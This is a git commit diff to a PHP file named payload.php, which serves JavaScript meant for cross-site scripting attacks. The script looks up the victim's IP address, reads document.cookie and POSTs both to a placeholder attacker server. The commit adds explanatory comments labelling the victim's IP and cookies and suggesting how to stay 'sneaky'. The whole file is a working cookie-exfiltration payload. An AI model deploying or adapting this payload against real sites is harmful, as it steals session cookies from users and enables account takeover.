8e9aac137f3d36864b3aa55f9bfd299d05220444
Nuno Dias <jookaada@protonmail.com>
2023-07-19 17:48:16 +0100

    Update payload.php

--- server/payload.php
+++ server/payload.php
@@ -1,23 +1,23 @@
 <?php
 
-header('Content-Type: application/javascript');
-header('Access-Control-Allow-Origin: *');
+header('Content-Type: application/javascript'); // wizardry
+header('Access-Control-Allow-Origin: *');       // for all of your Cross-Site-Origin problems
 
 ?>
 
 fetch('https://api.ipify.org?format=json')
   .then(response => response.json())
-  .then(data => {
-  console.log(data.ip);
-  let document_cookie = document.cookie;
+  .then(data => {  // promise wizardry: cant use promise values outside of a promise processing
+  console.log(data.ip);                  // victim's IP
+  let document_cookie = document.cookie; // victim's cookies
 
   const xhr = new XMLHttpRequest();
-  xhr.open("POST","https://<attack_server_hostname>:<port>",true);
-  var params = 'victim_ip='+data.ip+"&document_cookies="+document_cookie;
-  xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+  xhr.open("POST","https://<attack_server_hostname>:<port>",true);               // POST / HTTP/1.1
+  var params = 'victim_ip='+data.ip+"&document_cookies="+document_cookie;        // Content-Type: application/x-www-form-urlencoded
+  xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');      // victim_ip=xxx.xxx.xxx.xxx&document_cookies=XXXXX=xxxx;YYYY=yyyyy...
   xhr.onreadystatechange = function() {
-    if(xhr.readyState == 4 && xhr.status == 200) {
-      alert('should have locked your cookie jar');
+    if(xhr.readyState == 4 && xhr.status == 200) {                               // flair for attention
+      alert('should have locked your cookie jar');                               // comment if you're trying to be sneaky
     }
   }
   xhr.send(params);
